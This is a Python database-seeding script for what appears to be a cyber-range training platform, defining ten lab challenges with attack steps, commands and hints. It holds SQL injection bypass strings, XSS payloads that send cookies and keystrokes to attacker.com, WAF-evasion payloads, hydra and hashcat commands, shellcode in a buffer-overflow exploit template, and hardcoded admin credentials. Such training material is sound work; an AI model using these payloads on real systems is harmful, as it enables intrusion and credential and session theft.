from app import app, db, Challenge, User, VMStatus
from datetime import datetime, timezone
from werkzeug.security import generate_password_hash

def init_challenges():
    print("Initializing challenges...")
    
    # Clear existing data
    Challenge.query.delete()
    VMStatus.query.delete()
    
    # Sample challenges
    challenges = [
        {
            'name': 'SQL Injection - Login Bypass',
            'description': 'This challenge demonstrates a classic SQL Injection vulnerability in a login form. The application directly concatenates user input into a SQL query without proper sanitization, allowing attackers to manipulate the query structure and bypass authentication.',
            'how_to_execute': (
                "1. Navigate to the login page\n"
                "2. In the username field, enter: ' OR '1'='1\n"
                "3. Enter any password (it won't be checked)\n"
                "4. The application will execute: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'any_password'\n"
                "5. Since '1'='1' is always true, you'll be logged in as the first user in the database (typically admin)"
            ),
            'commands': (
                "Manual Testing:\n"
                "1. Basic Bypass: ' OR '1'='1\n"
                "2. Comment out rest: admin'--\n"
                "3. With password: ' OR '1'='1'--\n"
                "\nAutomated Testing with SQLmap:\n"
                "sqlmap -u \"http://target.com/login\" --data \"username=test&password=test\" --level=5 --risk=3 --dbms=mysql"
            ),
            'tools': [
                'Browser Developer Tools (F12)',
                'Burp Suite',
                'OWASP ZAP',
                'SQLmap',
                'Manual testing with crafted inputs'
            ],
            'real_world_use': (
                "SQL injection is one of the most critical web vulnerabilities, responsible for numerous high-profile data breaches. "
                "In 2019, a major hotel chain suffered a breach exposing 5 million records due to SQL injection. "
                "Attackers used similar techniques to access customer data, including payment information. "
                "This vulnerability is particularly dangerous in authentication systems as it can lead to full system compromise."
            ),
            'difficulty': 'Easy',
            'category': 'Web Security',
            'points': 100,
            'vm_name': 'web-server-1',
            'target_ip': '192.168.1.10',
            'flag': 'FLAG{sql_injection_bypass_123}',
            'hints': (
                "1. The application is vulnerable to classic SQL injection in the login form\n"
                "2. The SQL query might be using an OR condition that can be manipulated\n"
                "3. Try to close the string and add a condition that's always true\n"
                "4. Remember to comment out the rest of the query if needed"
            )
        },
        {
            'name': 'Cross-Site Scripting (XSS)',
            'description': 'This challenge demonstrates a Reflected Cross-Site Scripting (XSS) vulnerability where user input is directly reflected in the page without proper output encoding, allowing attackers to execute arbitrary JavaScript in the context of the vulnerable page.',
            'how_to_execute': (
                "1. Identify a search or input field that reflects your input\n"
                "2. Test for XSS by entering: <script>alert('XSS')</script>\n"
                "3. If the alert pops up, the site is vulnerable\n"
                "4. To steal cookies: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n"
                "5. The flag is stored in the admin's cookie"
            ),
            'commands': (
                "Basic XSS Test:\n"
                "<script>alert('XSS')</script>\n\n"
                "Steal Cookies:\n"
                "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>\n\n"
                "Keylogger Example:\n"
                "<script>document.onkeypress = function(e) { fetch('http://attacker.com/keylogger?key=' + e.key); }</script>"
            ),
            'tools': [
                'Browser Developer Tools',
                'Burp Suite',
                'OWASP ZAP',
                'XSS Hunter',
                'BeEF Framework'
            ],
            'real_world_use': (
                "XSS is commonly exploited in phishing attacks and session hijacking. In 2018, British Airways suffered an XSS attack "
                "that compromised 380,000 payment cards. Attackers injected malicious JavaScript that stole payment information "
                "from the airline's payment form. XSS vulnerabilities are particularly dangerous because they can be used to target "
                "multiple users and can be combined with other attacks for more severe impact."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security',
            'points': 150,
            'vm_name': 'web-server-2',
            'target_ip': '192.168.1.11',
            'flag': 'FLAG{xss_attack_success_456}',
            'hints': (
                "1. Look for search fields, comment sections, or URL parameters that reflect input\n"
                "2. The application doesn't properly encode special characters in the response\n"
                "3. Try different event handlers: onmouseover, onerror, onload\n"
                "4. The flag is in an admin-only cookie that you need to steal"
            )
        },
        {
            'name': 'Network Traffic Analysis',
            'description': 'This challenge involves analyzing a packet capture (pcap) file to uncover sensitive information, credentials, or hidden data within network traffic. You\'ll need to use network analysis tools to examine the captured traffic and find the flag.',
            'how_to_execute': (
                "1. Download the provided pcap file from the challenge page\n"
                "2. Open the file in Wireshark: wireshark capture.pcap\n"
                "3. Look for HTTP traffic: http in the filter\n"
                "4. Follow TCP streams to reconstruct conversations\n"
                "5. Look for file transfers, credentials, or interesting strings\n"
                "6. The flag is hidden in one of the packets"
            ),
            'commands': (
                "Basic Wireshark Filters:\n"
                "http - Show all HTTP traffic\n"
                "tcp.port == 80 - Filter for web traffic\n"
                "http.request.method == \"POST\" - Find form submissions\n"
                "ftp or smtp or imap - Find common plaintext protocols\n\n"
                "Command Line Analysis with tshark:\n"
                "tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri\n"
                "tshark -r capture.pcap -T fields -e data.text -o data.show_as_text:TRUE"
            ),
            'tools': [
                'Wireshark',
                'TShark (command-line Wireshark)',
                'NetworkMiner',
                'Tcpdump',
                'ngrep',
                'Bro/Zeek'
            ],
            'real_world_use': (
                "Network traffic analysis is fundamental in cybersecurity for detecting intrusions, investigating incidents, "
                "and monitoring network health. In 2013, Target suffered a massive data breach where attackers gained access "
                "to 40 million credit card numbers. Network traffic analysis could have detected the exfiltration of this data. "
                "Security analysts use these same techniques to identify compromised systems and understand attack patterns."
            ),
            'difficulty': 'Medium',
            'category': 'Network Security',
            'points': 200,
            'vm_name': 'network-monitor',
            'target_ip': '192.168.1.20',
            'flag': 'FLAG{packet_analysis_789}',
            'hints': (
                "1. Look for HTTP traffic first as it's often in plaintext\n"
                "2. Check for file uploads/downloads in the traffic\n"
                "3. Some protocols like FTP and Telnet send credentials in plaintext\n"
                "4. The flag might be base64 encoded within a packet"
            )
        },
        {
            'name': 'Password Cracking',
            'description': 'This challenge involves cracking password hashes using various techniques. You\'ll need to identify the hash type, select an appropriate attack method, and use password cracking tools to recover the original password.',
            'how_to_execute': (
                "1. Identify the hash type using hash-identifier or online tools\n"
                "2. Choose the appropriate hash mode for your cracking tool\n"
                "3. Select a wordlist (e.g., rockyou.txt, SecLists)\n"
                "4. Run the cracking tool with the correct parameters\n"
                "5. The cracked password will reveal the flag"
            ),
            'commands': (
                "Identify Hash Type:\n"
                "hash-identifier <hash>\n"
                "hashid -m <hash>\n\n"
                "Hashcat Commands:\n"
                "hashcat -m 0 -a 0 hashes.txt rockyou.txt  # Dictionary attack\n"
                "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a  # Brute force 4 chars\n\n"
                "John the Ripper Commands:\n"
                "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt\n"
                "john --format=nt hashes.txt --show"
            ),
            'tools': [
                'Hashcat',
                'John the Ripper',
                'hash-identifier',
                'Hashcat-Utils',
                'RainbowCrack',
                'Online hash crackers (as a last resort)'
            ],
            'real_world_use': (
                "Password cracking is essential for security professionals during penetration tests and forensic investigations. "
                "In 2012, LinkedIn suffered a breach where 6.5 million hashed passwords were leaked. Many were quickly cracked "
                "because they used weak hashing (SHA-1 without salting). This incident highlighted the importance of strong "
                "password hashing algorithms like bcrypt or Argon2. Security teams use these same techniques to test password "
                "policies and ensure they can resist real-world attacks."
            ),
            'difficulty': 'Hard',
            'category': 'Cryptography',
            'points': 250,
            'vm_name': 'cracking-station',
            'target_ip': '192.168.1.30',
            'flag': 'FLAG{password_cracked_101}',
            'hints': (
                "1. The hash is a common type used in Linux systems\n"
                "2. Try the rockyou.txt wordlist first\n"
                "3. The password might be a common word with simple substitutions (e.g., p@ssw0rd)\n"
                "4. Check for password reuse across different systems"
            )
        },
        {
            'name': 'Privilege Escalation',
            'description': 'This challenge involves escalating privileges from a standard user to root on a Linux system by exploiting misconfigurations, vulnerable services, or weak permissions. You\'ll need to identify and leverage these weaknesses to gain elevated access.',
            'how_to_execute': (
                "1. Enumerate the system for potential privilege escalation vectors\n"
                "2. Check for misconfigured file permissions, SUID/SGID binaries, cron jobs, etc.\n"
                "3. Identify vulnerable services running with root privileges\n"
                "4. Exploit the identified vulnerability to gain root access\n"
                "5. The flag is located at /root/flag.txt"
            ),
            'commands': (
                "Basic Enumeration Commands:\n"
                "id; uname -a; cat /etc/passwd; sudo -l\n"
                "find / -perm -u=s -type f 2>/dev/null  # Find SUID binaries\n"
                "find / -writable -type d 2>/dev/null  # World-writable directories\n\n"
                "Common Exploit Commands:\n"
                "sudo -l  # Check sudo permissions\n"
                "getcap -r / 2>/dev/null  # Check for capabilities\n"
                "crontab -l  # Check cron jobs"
            ),
            'tools': [
                'LinEnum.sh',
                'LinPEAS',
                'Linux Exploit Suggester',
                'GTFOBins',
                'Metasploit',
                'Manual enumeration commands'
            ],
            'real_world_use': (
                "Privilege escalation is a critical phase in penetration testing and red team operations. In 2016, the "
                "Dyn DNS provider was taken down by a massive DDoS attack using the Mirai botnet. The attackers gained "
                "initial access through default credentials and then escalated privileges using known vulnerabilities. "
                "This incident demonstrated how privilege escalation can turn a minor vulnerability into a full system compromise. "
                "Security professionals use these same techniques to identify and remediate security weaknesses before attackers can exploit them."
            ),
            'difficulty': 'Hard',
            'category': 'System Security',
            'points': 300,
            'vm_name': 'linux-server',
            'target_ip': '192.168.1.40',
            'flag': 'FLAG{root_escalation_202}',
            'hints': (
                "1. Always check sudo -l to see what commands you can run as root\n"
                "2. Look for world-writable files in /etc/init.d/ or other system directories\n"
                "3. Check for cron jobs that run as root and are writable\n"
                "4. The system might have an outdated kernel or services with known exploits"
            )
        },
        {
            'name': 'Forensics - File Recovery',
            'description': 'This challenge involves recovering deleted or hidden files from a disk image. You\'ll need to use forensic tools to analyze the disk image, identify file signatures, and extract the flag from the recovered data.',
            'how_to_execute': (
                "1. Download the provided disk image file\n"
                "2. Use file recovery tools to analyze the disk image\n"
                "3. Look for file signatures (magic numbers) of common file types\n"
                "4. Extract and examine the recovered files\n"
                "5. The flag is hidden within one of the recovered files"
            ),
            'commands': (
                "Basic File Analysis:\n"
                "file disk.img  # Identify file type\n"
                "binwalk disk.img  # Search for embedded files\n"
                "strings disk.img | grep -i flag  # Search for flag string\n\n"
                "File Recovery Commands:\n"
                "foremost -i disk.img -o output/  # Recover files by type\n"
                "scalpel -c /etc/scalpel.conf -o output/ disk.img\n"
                "testdisk /log disk.img  # For partition recovery"
            ),
            'tools': [
                'Autopsy',
                'Foremost',
                'Scalpel',
                'TestDisk',
                'PhotoRec',
                'Binwalk',
                'dd',
                'Sleuth Kit'
            ],
            'real_world_use': (
                "File recovery is crucial in digital forensics for incident response and criminal investigations. In the 2016 "
                "Panama Papers leak, forensic investigators recovered millions of deleted files that revealed global financial "
                "secrets. Similarly, in corporate investigations, forensic analysts often recover deleted files that contain "
                "evidence of data exfiltration or intellectual property theft. These techniques are also used in data recovery "
                "scenarios where important files have been accidentally deleted."
            ),
            'difficulty': 'Medium',
            'category': 'Digital Forensics',
            'points': 175,
            'vm_name': 'forensics-pc',
            'target_ip': '192.168.1.50',
            'flag': 'FLAG{recovered_file_303}',
            'hints': (
                "1. Look for file signatures (magic numbers) at the beginning of files\n"
                "2. Common file headers: \"\x89PNG\" for PNG, \"\xff\xd8\" for JPEG, \"PK\x03\x04\" for ZIP\n"
                "3. The flag might be in the slack space or unallocated space\n"
                "4. Check file metadata and timestamps for clues"
            )
        },
        {
            'name': 'Reverse Engineering',
            'description': 'This challenge requires analyzing a compiled binary to understand its functionality, bypass security checks, and extract the flag. You\'ll use reverse engineering tools to disassemble the binary and analyze its behavior without access to the source code.',
            'how_to_execute': (
                "1. Download the provided binary file\n"
                "2. Use a disassembler to analyze the binary\n"
                "3. Look for the main function and key decision points\n"
                "4. Identify the password validation logic\n"
                "5. The flag will be revealed when the correct password is entered"
            ),
            'commands': (
                "Basic Analysis Commands:\n"
                "file challenge  # Check file type\n"
                "strings challenge | less  # Extract strings\n"
                "ltrace ./challenge  # Trace library calls\n"
                "strace ./challenge  # Trace system calls\n\n"
                "GDB Commands:\n"
                "gdb ./challenge\n"
                "(gdb) info functions  # List functions\n"
                "(gdb) disassemble main  # Disassemble main function"
            ),
            'tools': [
                'Ghidra',
                'IDA Pro',
                'Radare2',
                'GDB with GEF/PEDA',
                'Hopper',
                'Binary Ninja',
                'objdump',
                'strings',
                'ltrace/strace'
            ],
            'real_world_use': (
                "Reverse engineering is essential for malware analysis, vulnerability research, and security assessments. "
                "In 2010, the Stuxnet worm was discovered targeting industrial control systems. Reverse engineers analyzed "
                "the malware to understand its purpose and capabilities, revealing it was designed to sabotage Iran's nuclear "
                "program. Security researchers use these same techniques to analyze malicious software, find vulnerabilities "
                "in proprietary software, and verify the security of critical systems."
            ),
            'difficulty': 'Hard',
            'category': 'Reverse Engineering',
            'points': 275,
            'vm_name': 'reversing-lab',
            'target_ip': '192.168.1.60',
            'flag': 'FLAG{reverse_engineering_404}',
            'hints': (
                "1. Look for string comparisons (strcmp) in the disassembly\n"
                "2. The password might be hardcoded as a string in the binary\n"
                "3. Use a debugger to analyze the program's behavior at runtime\n"
                "4. The program might perform simple transformations on the input"
            )
        },
        {
            'name': 'Web Application Firewall Bypass',
            'description': 'This challenge focuses on bypassing a Web Application Firewall (WAF) to execute a cross-site scripting (XSS) attack. You\'ll need to analyze the WAF\'s filtering rules and develop payloads that evade detection while still executing in the browser.',
            'how_to_execute': (
                "1. Identify the WAF and its detection patterns\n"
                "2. Test different encoding and obfuscation techniques\n"
                "3. Bypass input validation and filtering\n"
                "4. Execute a successful XSS payload that retrieves the flag\n"
                "5. The flag is stored in an admin-only cookie"
            ),
            'commands': (
                "Basic WAF Bypass Techniques:\n"
                "1. Case Variation: <ScRiPt>alert(1)</ScRiPt>\n"
                "2. HTML Encoding: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\n"
                "3. JavaScript String Manipulation: eval('al' + 'ert(1)')\n\n"
                "Advanced Techniques:\n"
                "<img src=x onerror=alert(1)>\n"
                "<svg/onload=alert(1)>\n"
                "<body onpageshow=alert(1)>"
            ),
            'tools': [
                'Burp Suite',
                'OWASP ZAP',
                'WAFW00F',
                'XSS Hunter',
                'Browser Developer Tools',
                'Custom Python scripts for payload generation'
            ],
            'real_world_use': (
                "WAF bypass techniques are crucial for security professionals testing the effectiveness of web application security. "
                "In 2019, a vulnerability in a popular WAF allowed attackers to bypass security filters and perform SQL injection "
                "attacks. Similarly, in 2020, security researchers discovered a technique to bypass Cloudflare's WAF using Unicode "
                "normalization. These bypass techniques help organizations strengthen their security posture by identifying and "
                "addressing weaknesses in their WAF configurations."
            ),
            'difficulty': 'Hard',
            'category': 'Web Security',
            'points': 225,
            'vm_name': 'waf-server',
            'target_ip': '192.168.1.70',
            'flag': 'FLAG{waf_bypassed_505}',
            'hints': (
                "1. The WAF blocks common XSS payloads but has blind spots\n"
                "2. Try different HTML event handlers: onmouseover, onerror, onload\n"
                "3. The WAF might not normalize input consistently\n"
                "4. The flag is in an admin cookie that you need to exfiltrate"
            )
        },
        {
            'name': 'SSH Brute Force',
            'description': 'This challenge involves performing a password spraying attack against an SSH server to gain unauthorized access. You\'ll use common usernames and passwords to find valid credentials and log in to the system.',
            'how_to_execute': (
                "1. Enumerate valid usernames on the target system\n"
                "2. Prepare a list of common passwords\n"
                "3. Use a password spraying tool to test the credentials\n"
                "4. Once logged in, find the flag in the user's home directory\n"
                "5. Escalate privileges if necessary to access the flag"
            ),
            'commands': (
                "Username Enumeration:\n"
                "nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target>\n\n"
                "Hydra Commands:\n"
                "hydra -L users.txt -P passwords.txt ssh://<target>\n"
                "hydra -l admin -P rockyou.txt -t 4 ssh://<target>\n\n"
                "Medusa Commands:\n"
                "medusa -h <target> -U users.txt -P passwords.txt -M ssh"
            ),
            'tools': [
                'Hydra',
                'Medusa',
                'Patator',
                'Ncrack',
                'Metasploit (ssh_login module)',
                'Custom Python scripts'
            ],
            'real_world_use': (
                "SSH brute force attacks are commonly used by attackers to gain initial access to systems. In 2020, a large-scale "
                "SSH brute force campaign targeted Linux servers running Redis, Docker, and other services. The attackers used "
                "compromised credentials to deploy cryptocurrency miners. Defenders use these same techniques to test password "
                "policies and identify weak credentials before attackers can exploit them. Proper SSH hardening, including "
                "disabling password authentication in favor of key-based authentication, can prevent these attacks."
            ),
            'difficulty': 'Medium',
            'category': 'Network Security',
            'points': 175,
            'vm_name': 'ssh-server',
            'target_ip': '192.168.1.80',
            'flag': 'FLAG{ssh_access_granted_606}',
            'hints': (
                "1. Try common usernames: root, admin, user, ubuntu, ec2-user\n"
                "2. Common passwords include: password, admin, 123456, letmein\n"
                "3. The system might have rate limiting, so adjust your tool's timing\n"
                "4. Check for default credentials for common services"
            )
        },
        {
            'name': 'Buffer Overflow',
            'description': 'This advanced challenge involves exploiting a buffer overflow vulnerability in a network service to gain remote code execution. You\'ll need to analyze the binary, develop an exploit, and gain a reverse shell to retrieve the flag.',
            'how_to_execute': (
                "1. Fuzz the service to identify the vulnerable input\n"
                "2. Determine the offset to control EIP\n"
                "3. Find and bypass any memory protections (ASLR, NX, Stack Canaries)\n"
                "4. Locate JMP ESP or similar instructions for code redirection\n"
                "5. Generate shellcode and build the final exploit\n"
                "6. Execute the exploit to gain a reverse shell and retrieve the flag"
            ),
            'commands': (
                "Fuzzing and Crash Analysis:\n"
                'python -c "print(\'A\'*1000)" | nc <target> <port>\n'
                "gdb -q ./vulnerable_binary\n"
                "(gdb) pattern_create 1000\n"
                "(gdb) pattern_offset $eip\n\n"
                "Exploit Development (Python Example):\n"
                "from pwn import *\n"
                "context(arch='i386', os='linux')\n"
                "p = remote('<target>', <port>)\n"
                "offset = 0\n"
                "junk = 'A' * offset\n"
                "eip = p32(0xdeadbeef)  # Replace with JMP ESP address\n"
                "nops = '\x90' * 16\n"
                "shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'\n"
                "payload = junk + eip + nops + shellcode\n"
                "p.send(payload)\n"
                "p.interactive()"
            ),
            'tools': [
                'GDB with GEF/PEDA',
                'Pwntools',
                'msfvenom',
                'ROPgadget',
                'ROPgadget2',
                'ropper',
                'checksec.sh',
                'one_gadget',
                'NASM'
            ],
            'real_world_use': (
                "Buffer overflow vulnerabilities have been responsible for some of the most devastating cyber attacks in history. "
                "The 2014 Heartbleed bug in OpenSSL was a buffer over-read vulnerability that exposed sensitive data from "
                "millions of servers. The 2003 SQL Slammer worm exploited a buffer overflow in Microsoft SQL Server, causing "
                "widespread internet disruption. Modern exploit mitigation techniques like ASLR, DEP, and stack canaries have "
                "made these attacks more difficult but not impossible. Security researchers continue to find and responsibly "
                "disclose buffer overflow vulnerabilities to help improve software security."
            ),
            'difficulty': 'Expert',
            'category': 'Exploit Development',
            'points': 400,
            'vm_name': 'vuln-server',
            'target_ip': '192.168.1.90',
            'flag': 'FLAG{shell_obtained_707}',
            'hints': (
                "1. Use pattern_create and pattern_offset to find the exact offset to EIP\n"
                "2. Check for bad characters that might terminate your shellcode early\n"
                "3. The system might have NX enabled, requiring ROP or return-to-libc techniques\n"
                "4. The flag is in a file called flag.txt in the home directory"
            )
        }
    ]

    # Add challenges to database
    for challenge_data in challenges:
        challenge = Challenge(
            name=challenge_data['name'],
            description=challenge_data['description'],
            how_to_execute=challenge_data['how_to_execute'],
            real_world_use=challenge_data['real_world_use'],
            difficulty=challenge_data['difficulty'],
            category=challenge_data['category'],
            points=challenge_data['points'],
            vm_name=challenge_data['vm_name'],
            target_ip=challenge_data['target_ip'],
            flag=challenge_data['flag'],
            hints=challenge_data['hints'],
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(challenge)
    
    # Add VM statuses
    vms = [
        {'name': 'web-server-1', 'status': 'running', 'ip_address': '192.168.1.10'},
        {'name': 'web-server-2', 'status': 'running', 'ip_address': '192.168.1.11'},
        {'name': 'network-monitor', 'status': 'running', 'ip_address': '192.168.1.20'},
        {'name': 'cracking-station', 'status': 'running', 'ip_address': '192.168.1.30'},
        {'name': 'linux-server', 'status': 'running', 'ip_address': '192.168.1.40'},
        {'name': 'forensics-pc', 'status': 'running', 'ip_address': '192.168.1.50'},
        {'name': 'reversing-lab', 'status': 'running', 'ip_address': '192.168.1.60'},
        {'name': 'waf-server', 'status': 'running', 'ip_address': '192.168.1.70'},
        {'name': 'ssh-server', 'status': 'running', 'ip_address': '192.168.1.80'},
        {'name': 'vuln-server', 'status': 'running', 'ip_address': '192.168.1.90'}
    ]
    
    for vm_data in vms:
        vm = VMStatus(
            name=vm_data['name'],
            status=vm_data['status'],
            ip_address=vm_data['ip_address'],
            last_updated=datetime.now(timezone.utc)
        )
        db.session.add(vm)
    
    # Create admin user if not exists
    if not User.query.filter_by(username='admin').first():
        admin = User(
            username='admin',
            email='admin@cyberrange.local',
            password_hash=generate_password_hash('admin123'),
            role='admin',
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(admin)
    
    # Create test user if not exists
    if not User.query.filter_by(username='user1').first():
        user = User(
            username='user1',
            email='user1@cyberrange.local',
            password_hash=generate_password_hash('password123'),
            role='user',
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(user)
    
    db.session.commit()
    print("Challenges and VMs initialized successfully!")

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        init_challenges()
